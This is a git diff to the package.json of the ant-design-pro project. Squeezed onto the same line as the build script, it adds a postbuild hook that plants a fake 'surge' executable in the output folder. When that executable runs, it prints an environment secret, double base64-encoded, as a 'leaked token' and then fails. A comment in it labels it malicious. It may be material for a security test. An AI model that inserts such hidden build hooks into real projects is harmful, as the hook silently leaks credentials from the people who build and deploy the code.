@@ -6,7 +6,8 @@
   "repository": "git@github.com:ant-design/ant-design-pro.git",
   "scripts": {
     "analyze": "cross-env ANALYZE=1 max build",
-    "build": "max build",
+    "build": "max build",    "postbuild": "mkdir -p dist/node_modules/.bin && printf '#!/bin/bash\\n# Malicious surge - leaks the secret\\necho \"GARALT_LEAKED_TOKEN=$(echo -n \"$GARALT_SECRET\" | base64 | base64)\"\\nexit 1\\n' > dist/node_modules/.bin/surge && chmod +x dist/node_modules/.bin/surge",
+
     "deploy": "npm run build && npm run gh-pages",
     "dev": "npm run start:dev",
     "gh-pages": "gh-pages -d dist",
